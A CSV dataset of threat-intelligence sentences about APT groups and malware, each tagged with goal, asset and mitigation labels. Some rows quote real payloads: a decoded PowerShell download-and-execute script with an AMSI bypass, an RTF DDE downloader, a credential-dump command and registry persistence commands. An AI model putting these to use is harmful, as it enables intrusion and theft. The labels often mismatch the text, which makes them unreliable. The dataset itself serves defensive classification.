incident,goal,assets,solutions
Personas may exist on a single site or across multiple sites .,availability,users data,data loss prevention
OSX/Shlayer executes a .command script from a hidden directory in a mounted DMG.,availability,users data,endpoint detection and response
WHOIS data is stored by regional Internet registries  responsible for allocating and assigning Internet resources such as domain names.,availability,users data,disable macros
Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server,availability,running processes,endpoint detection and response
Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.,availability,users data,data loss prevention
Gold Dragon checks the running processes on the victim’s machine.,availability,running processes,application whitelisting
"On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.",availability,authentication data,endpoint detection and response
Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user.,availability,running processes,application whitelisting
Attor has manipulated the time of last access to files and registry keys after they have been created or modified.,integrity,users data,endpoint detection and response
TeamTNT has searched for unsecured SSH keys.,availability,running processes,application whitelisting
Cardinal RAT sets HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load to point to its executable.,availability,running processes,application whitelisting
APT37's has added persistence via the Registry key HKCU\Software\Microsoft\CurrentVersion\Run\.,availability,operating system,endpoint detection and response
"Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",availability,running processes,endpoint detection and response
Adversaries can use stolen session cookies to authenticate to web applications and services.,availability,running processes,endpoint detection and response
Valak has the ability to modify the Registry key HKCU\Software\ApplicationContainer\Appsw64 to store information regarding the C2 server and downloads.,availability,authentication data,multifactor authentication
Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges.,availability,authentication data,endpoint detection and response
ZIRCONIUM has used multi-stage packers for exploit code.,availability,authentication data,endpoint detection and response
REvil can mark its binary code for deletion after reboot.,availability,running processes,user account control
"Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.",availability,users data,application whitelisting
Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory,availability,users data,endpoint detection and response
GreyEnergy encrypts communications using AES256.,integrity,networks,network segmentation and filtering
"OSX/Shlayer can download payloads, and extract bytes from files.",availability,users data,stronger key exchange algorithms
RainyDay can decrypt its payload via a XOR key.,availability,authentication data,multifactor authentication
"Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows.",availability,users data,access controls
"HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”",availability,running processes,endpoint detection and response
"Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network",availability,users data,data loss prevention
Peppy can identify specific files for exfiltration.,availability,application software,network segmentation and filtering
"Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.",availability,authentication data,access controls
FinFisher establishes persistence by creating the Registry key HKCU\Software\Microsoft\Windows\Run.,availability,running processes,endpoint detection and response
"If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",availability,users data,data loss prevention
Operators deploying Netwalker have used batch scripts to retrieve the Netwalker payload.,availability,email accounts,endpoint detection and response
AuditCred encrypts the configuration.,availability,users data,endpoint detection and response
"Links may also direct users to malicious applications  designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.",availability,application software,application whitelisting
SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.,availability,users data,data loss prevention
They have also dumped credentials from domain controllers.,availability,networks,data loss prevention
"LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero.",availability,application software,application whitelisting
 /etc/passwd ,availability,running processes,endpoint detection and response
APT41 modified legitimate Windows services to install malware backdoors.,availability,running processes,application whitelisting
"Modifications to domain settings may include altering domain Group Policy Objects  or changing trust settings for domains, including federation trusts.",availability,authentication data,application whitelisting
DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.,availability,operating system,update security patches
Lazarus Group has developed several custom malware for use in operations.,availability,running processes,endpoint detection and response
"Gathering this information may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains, establishing operational resources  or Compromise Accounts, and/or initial access .",availability,application software,application whitelisting
LightNeuron can be configured to automatically exfiltrate files under a specified directory.,availability,running processes,application whitelisting
LTD. Stuxnet used a digitally signed driver with a compromised Realtek certificate.,availability,authentication data,multifactor authentication
Machete collects the MAC address of the target computer and other network configuration information.,availability,networks,stronger key exchange algorithms
"As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",availability,running processes,application whitelisting
Use of multiple stages may obfuscate the command and control channel to make detection more difficult.,availability,users data,data loss prevention
down_new has the ability to gather information on installed applications.,availability,email accounts,multifactor authentication
"Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.",availability,networks,endpoint detection and response
Taidoor has relied upon a victim to click on a malicious email attachment.,availability,application software,endpoint detection and response
"Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.",availability,authentication data,disable macros
"Any user or administrator within the organization  can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.",availability,operating system,application whitelisting
PoetRAT has called cmd through a Word document macro.,availability,running processes,application whitelisting
"Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers",availability,running processes,endpoint detection and response
NOKKI has downloaded a remote module for execution.,availability,running processes,application whitelisting
"Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.",availability,operating system,access controls
Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. .   Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.,availability,users data,data loss prevention
Proton kills security tools like Wireshark that are running.,availability,users data,endpoint detection and response
Crutch has conducted C2 communications with a Dropbox account using the HTTP API.,availability,operating system,application whitelisting
This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode,availability,application software,network segmentation and filtering
Elise enumerates processes via the tasklist command.,availability,authentication data,access controls
Malicious files will be transmitted directly as attachments or through links to download them.,availability,running processes,endpoint detection and response
OilRig has used HTTP for C2.,availability,authentication data,endpoint detection and response
Windows Transactional NTFS  was introduced in Vista as a method to perform safe file operations.,availability,email accounts,data loss prevention
POWRUNER persists through a scheduled task that executes it every minute.,availability,operating system,endpoint detection and response
This script relays commands and output between the controller and the system,availability,users data,endpoint detection and response
StrongPity can add directories used by the malware to the Windows Defender exclusions list to prevent detection.,availability,operating system,endpoint detection and response
"Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files",availability,running processes,endpoint detection and response
Placing a program within a startup folder will also cause that program to execute when a user logs in.,availability,users data,data loss prevention
BadPatch stores collected data in log files before exfiltration.,availability,authentication data,stronger key exchange algorithms
GrimAgent can use an AES key to encrypt C2 communications.,availability,running processes,endpoint detection and response
Bankshot collects files from the local system.,availability,application software,update security patches
APT28 has collected files from network shared drives.,availability,networks,network segmentation and filtering
ChinaChopper web shell,availability,operating system,application whitelisting
Pysa has the functionality to delete shadow copies.,availability,networks,network segmentation and filtering
Lazarus Group has renamed the TAINTEDSCRIBE main executable to disguise itself as Microsoft's narrator.,availability,users data,endpoint detection and response
Olympic Destroyer uses the API call ChangeServiceConfigW to disable all services on the affected system.,availability,running processes,firewall rules harden
TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.,availability,application software,endpoint detection and response
Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.,availability,running processes,endpoint detection and response
Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts.,availability,running processes,application whitelisting
"By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",integrity,running processes,access controls
Adversaries may transfer tools or other files from an external system into a compromised environment.,availability,application software,application whitelisting
"Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems.",availability,users data,disable macros
Darkhotel malware can obtain system time from a compromised host.,availability,authentication data,stronger key exchange algorithms
"The PowerShell command decodes to the following:$command = 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACAAIAAgACAAdAByAHkAewAgAAoAIAAgACAAIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACAAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACAAJAB0AHIAdQBlACkACgAgACAAIAAgAH0AYwBhAHQAYwBoAHsAfQAKACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADkALgA1ADkALgA0ADYALgAxADUANAA6ADMANAA4ADUALwBJAE0AbwA4AG8AbwBzAGkAZQBWAGEAaQAnACkAOwAKACAAIAAgACAA'         if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')          {                          $exec = $Env:windir + '\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command             IEX $exec         }         else         {             $exec = [System.Convert]::FromBase64String($command)             $exec = [Text.Encoding]::Unicode.GetString($exec)             IEX $exec         }The script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};     try{      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)     }catch{}     IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');This decoded PowerShell script attempts to download and execute a file using HTTP from the URL “hxxp:// 139.59.46[.]154:3485 /IMo8oosieVai”",availability,authentication data,endpoint detection and response
Kimsuky has executed a variety of PowerShell scripts.,availability,users data,application whitelisting
OilRig has used Remote Desktop Protocol for lateral movement.,availability,users data,data loss prevention
"The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.",availability,application software,application whitelisting
Zeus Panda modifies several Registry keys under HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\ to disable phishing filters.,availability,running processes,endpoint detection and response
"Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.",availability,running processes,endpoint detection and response
"As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.",availability,running processes,application whitelisting
Windigo has used a script to detect installed software on targeted systems.,availability,users data,access controls
Dtrack can collect the host's IP addresses using the ipconfig command.,availability,users data,data loss prevention
The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis.,availability,running processes,endpoint detection and response
Gamaredon Group malware has collected Microsoft Office documents from mapped network drives.,availability,running processes,endpoint detection and response
Kerrdown can use a VBS base64 decoder function published by Motobit.,availability,application software,stronger key exchange algorithms
"Adversaries may use commands such as gpresult or various publicly available PowerShell functions, such as Get-DomainGPO and Get-DomainGPOLocalGroup, to gather information on Group Policy settings.",availability,operating system,endpoint detection and response
Raindrop was installed under names that resembled legitimate Windows file and directory names.,availability,application software,network segmentation and filtering
GoldenSpy has used the Ryeol HTTP Client to facilitate HTTP internet communication.,availability,operating system,application whitelisting
Masquerading may increase the chance of users mistakenly executing these files.,availability,running processes,application whitelisting
COM + hijack in same sentence,availability,users data,multifactor authentication
TYPEFRAME can uninstall malware components using a batch script.,availability,operating system,firewall rules harden
Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them.,availability,running processes,endpoint detection and response
Carbanak checks the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings for proxy configurations information.,availability,application software,endpoint detection and response
SpicyOmelette has been signed with valid digital certificates.,integrity,running processes,application whitelisting
APT32 includes garbage code to mislead anti-malware software and researchers.,availability,users data,access controls
"FIN6 has used tools like Adfind to query users, groups, organizational units, and trusts.",availability,running processes,application whitelisting
"Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection",availability,application software,disable macros
"Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications.",availability,users data,network segmentation and filtering
Adversaries may gather credentials via APIs within a containers environment.,availability,email accounts,update security patches
MuddyWater has specifically targeted government agency employees with spearphishing e-mails.,availability,networks,data loss prevention
Adversaries may establish persistence through executing malicious commands triggered by a user’s shell.,availability,users data,data loss prevention
APT18 obfuscates strings in the payload.,availability,operating system,application whitelisting
Chimera has used compromised domain accounts to gain access to the target environment.,availability,authentication data,multifactor authentication
ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.,availability,application software,network segmentation and filtering
Operation Wocao has obtained the password for the victim's password manager via a custom keylogger.,availability,application software,application whitelisting
"The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”",availability,running processes,endpoint detection and response
"Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.",availability,users data,endpoint detection and response
Bandook can collect information about the drives available on the system.,availability,authentication data,endpoint detection and response
Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.,integrity,running processes,endpoint detection and response
"Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session.",availability,application software,application whitelisting
BLUELIGHT has a XOR-encoded payload.,availability,running processes,endpoint detection and response
"Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments",availability,running processes,application whitelisting
Denis has a command to delete files from the victim’s machine.,availability,email accounts,multifactor authentication
Dtrack’s dropper can list all running processes.,availability,running processes,endpoint detection and response
Carberp can start a remote VNC session by downloading a new plugin.,availability,authentication data,application whitelisting
Adversaries may modify XDG autostart entries to execute programs or commands during system boot.,availability,running processes,application whitelisting
Adversaries may also compile WMI scripts into Windows Management Object  files  that can be used to create a malicious subscription.,availability,authentication data,stronger key exchange algorithms
AuditCred uses XOR and RC4 to perform decryption on the code functions.,availability,authentication data,stronger key exchange algorithms
"APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.",availability,running processes,application whitelisting
Service principal names  are used to uniquely identify each instance of a Windows service.,availability,authentication data,endpoint detection and response
"Smart, optimized, and connected, XGen security powers Trend Micro’s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense",availability,application software,application whitelisting
APT29 used AUDITPOL to prevent the collection of audit logs.,availability,authentication data,endpoint detection and response
Access is usually obtained through compromising accounts used to manage cloud infrastructure.,availability,users data,access controls
Whitefly has used malicious .exe or .dll files disguised as documents or images.,availability,networks,network segmentation and filtering
Lazarus Group malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.,availability,users data,data loss prevention
Ramsay can use the Windows COM API to schedule tasks and maintain persistence.,availability,running processes,endpoint detection and response
Adversaries may target user email on local systems to collect sensitive information.,availability,authentication data,network segmentation and filtering
Leviathan has exfiltrated data over its C2 channel.,availability,authentication data,network segmentation and filtering
They may also be found as parameters to deployment commands in container logs.,availability,authentication data,multifactor authentication
Cobalt Group has used the command cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt to bypass AppLocker and launch a malicious script.,availability,running processes,endpoint detection and response
Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command.,availability,users data,data loss prevention
Ixeshe can list running processes.,availability,users data,access controls
APT39 has utilized tools to capture mouse movements.,availability,running processes,application whitelisting
CoinTicker executes a bash script to establish a reverse shell.,availability,running processes,endpoint detection and response
PUNCHBUGGY can load a DLL using Rundll32.,availability,users data,data loss prevention
Attor has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.,availability,email accounts,update security patches
APT3 will identify Microsoft Office documents on the victim's computer.,availability,users data,data loss prevention
"Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR /NBT-NS  traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system.",availability,email accounts,network segmentation and filtering
ServHelper can execute shell commands against cmd.,availability,operating system,update security patches
ServHelper uses HTTP for C2.,availability,users data,application whitelisting
* In some cases a second visit to the website after the initial scan is required before exploit code is delivered.,availability,users data,stronger key exchange algorithms
Regin has used a hidden file system to store some of its components.,availability,users data,endpoint detection and response
RATANKBA uses WMI to perform process monitoring.,availability,running processes,application whitelisting
Naikon has used a netbios scanner for remote machine identification.,availability,running processes,application whitelisting
Leviathan has compromised social media accounts to conduct social engineering attacks.,availability,networks,access controls
Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.,availability,running processes,endpoint detection and response
The GuLoader executable has been retrieved via embedded macros in malicious Word documents.,availability,running processes,application whitelisting
"However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.",availability,operating system,update security patches
TSCookie can multiple protocols including HTTP and HTTPS in communication with command and control  servers.,availability,authentication data,multifactor authentication
"Octopus can collect system drive information, the computer name, and the size of the disk.",availability,running processes,disable macros
Honeybee embeds a Visual Basic script within a malicious Word document as part of initial access; the script is executed when the Word document is opened.,availability,users data,data loss prevention
"Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.",availability,users data,endpoint detection and response
Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers.,availability,running processes,application whitelisting
Okrum's loader can check the amount of physical memory and terminates itself if the host has less than 1.5 Gigabytes of physical memory in total.,availability,running processes,application whitelisting
Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems.,availability,operating system,application whitelisting
PoisonIvy uses the Camellia cipher to encrypt communications.,availability,operating system,application whitelisting
APT19 also used an HTTP malware variant to communicate over HTTP for C2.,availability,running processes,application whitelisting
PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.,availability,application software,application whitelisting
BackConfig has the ability to remove files and folders related to previous infections.,availability,users data,disable macros
Clop has used the sleep command to avoid sandbox detection.,availability,running processes,application whitelisting
POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued,availability,application software,application whitelisting
Zeus Panda decrypts strings in the code during the execution process.,availability,authentication data,endpoint detection and response
Kazuar obtains a list of running processes through WMI querying and the ps command.,availability,running processes,endpoint detection and response
APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property,availability,networks,network segmentation and filtering
"For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil.dll"" 
The following Registry keys can be used to set startup folder items for persistence:
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
The following Registry keys can control automatic startup of services during boot:
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7.",availability,application software,update security patches
"The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.",availability,running processes,endpoint detection and response
PowerShell supports several profiles depending on the user or host program.,availability,application software,disable macros
Grandoreiro can collect the username from the victim's machine.,availability,networks,network segmentation and filtering
"APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.",availability,running processes,endpoint detection and response
Dridex has used POST requests and HTTPS for C2 communications.,availability,users data,endpoint detection and response
There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a malicious proxy  that can be set up by an adversary and used in phishing campaigns.,availability,application software,application whitelisting
Industroyer’s main backdoor connected to a remote C2 server using HTTPS.,availability,users data,access controls
Epic encrypts commands from the C2 server using a hardcoded key.,integrity,operating system,application whitelisting
adbupd contains a copy of the OpenSSL library to encrypt C2 traffic.,availability,users data,endpoint detection and response
Goopy has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.,availability,application software,network segmentation and filtering
Lazarus Group malware KiloAlfa contains keylogging functionality.,availability,application software,network segmentation and filtering
APT38 has enumerated network shares on a compromised host.,availability,application software,application whitelisting
"Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via cmsadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database.",availability,running processes,application whitelisting
Turla has used tracert to check internet connectivity.,availability,running processes,application whitelisting
The script saves the decoded and decompressed executable to %APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up,availability,email accounts,endpoint detection and response
ADVSTORESHELL compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch  algorithm.,availability,users data,endpoint detection and response
"For comparison, if we were to inspect Fysbis “RemoteShell” associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and – more importantly – further contribute to correlation and detection across related samples",availability,running processes,endpoint detection and response
VERMIN can perform audio capture.,availability,users data,data loss prevention
Winnti for Windows sets its DLL file as a new service in the Registry to establish persistence.,availability,networks,network segmentation and filtering
ChChes can encrypt C2 traffic with AES or RC4.,availability,operating system,endpoint detection and response
"An adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",availability,authentication data,access controls
Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.,availability,running processes,endpoint detection and response
"AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.",availability,authentication data,multifactor authentication
.iqy files are simple text files containing a URL which are opened by default by Excel,availability,authentication data,endpoint detection and response
ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.,availability,authentication data,data loss prevention
"Figure 6 Example of delivery document The RTF document (8cf3bc2bf…) was very small in size at 264 bytes, which can be seen in its entirety here:       {\rtf1{\field{\*\fldinst DDEAUTO ""C:\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe "" ""/C	POWErsHELl.eXE  -ex     BypaSs  -NOP	-w      HIdDen  (NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'  ,       '%apPDAtA%\graph.exe'   )   ;       saps    '%Appdata%\graph.exe'""}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload",availability,authentication data,endpoint detection and response
"To support their operations, an adversary may need to take capabilities they developed  or obtained  and stage them on infrastructure under their control.",availability,users data,data loss prevention
APT28 has used tools to perform keylogging.,availability,authentication data,data loss prevention
This means that any domain user can view the SYSVOL share and decrypt the password .,availability,networks,network segmentation and filtering
Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.,integrity,running processes,application whitelisting
Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.,availability,networks,network segmentation and filtering
Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning.,availability,application software,endpoint detection and response
InvisiMole can also search for specific files by supplied file mask.,availability,users data,application whitelisting
FLASHFLOOD employs the same encoding scheme as SPACESHIP for data it stages.,availability,operating system,application whitelisting
Pay2Key can identify the IP and MAC addresses of the compromised host.,availability,authentication data,user account control
"For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",availability,users data,endpoint detection and response
ISAPI extensions and filters may have access to all IIS web requests and responses.,availability,running processes,endpoint detection and response
Hildegard has established tmate sessions for C2 communications.,availability,running processes,application whitelisting
QakBot can identify whether it has been run previously on a host by checking for a specified folder.,availability,running processes,endpoint detection and response
"Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts",availability,authentication data,endpoint detection and response
"The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it",availability,email accounts,multifactor authentication
An administrator can also configure a profile that applies to all users and host programs on the local computer.,availability,authentication data,multifactor authentication
Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.,availability,networks,network segmentation and filtering
Kimsuky has used JScript for logging and downloading additional tools.,availability,authentication data,multifactor authentication
DustySky searches for removable media and duplicates itself onto it.,availability,networks,stronger key exchange algorithms
PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.,availability,operating system,endpoint detection and response
Babuk has the ability to check running processes on a targeted system.,availability,authentication data,stronger key exchange algorithms
Leviathan has used C:\Windows\Debug and C:\Perflogs as staging directories.,availability,networks,firewall rules harden
APT37 obfuscates strings and payloads.,availability,application software,endpoint detection and response
They could subsequently lock others out of the file.,availability,authentication data,stronger key exchange algorithms
Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.,availability,operating system,application whitelisting
It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents,availability,authentication data,endpoint detection and response
